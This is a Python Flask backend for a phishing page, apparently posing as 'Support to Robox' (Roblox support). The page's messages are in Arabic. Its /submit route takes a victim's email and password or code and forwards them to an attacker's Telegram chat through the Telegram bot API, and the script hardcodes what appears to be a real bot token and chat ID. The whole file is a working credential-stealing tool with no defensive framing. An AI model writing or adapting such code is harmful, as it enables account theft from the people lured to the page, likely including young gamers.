from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__, template_folder='.', static_folder='.')

BOT_TOKEN = "9180802817:AAEjgov9nzXgV_Wtvun7I4rkLg2wOn4Dp4s"
CHAT_ID = "6517028407"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json(silent=True) or request.form
    email = data.get('email') or data.get('gmail') or ''
    password = data.get('password') or data.get('code') or data.get('pass') or ''

    if not email or not password:
        return jsonify({'status': 'error', 'message': 'يرجى إدخال جميع البيانات'}), 400

    text = f"🔔 **بيانات جديدة - Support to Robox**\n\n📧 **الجيميل:** `{email}`\n🔑 **الرمز:** `{password}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }

    try:
        response = requests.post(url, json=payload, timeout=10)
        res_data = response.json()
        if response.status_code == 200 and res_data.get("ok"):
            return jsonify({'status': 'success', 'message': 'تم الإرسال بنجاح'})
        else:
            error_desc = res_data.get("description", "خطأ غير معروف من تليجرام")
            return jsonify({'status': 'error', 'message': f'خطأ تليجرام: {error_desc}'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'خطأ في الاتصال: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(debug=True)
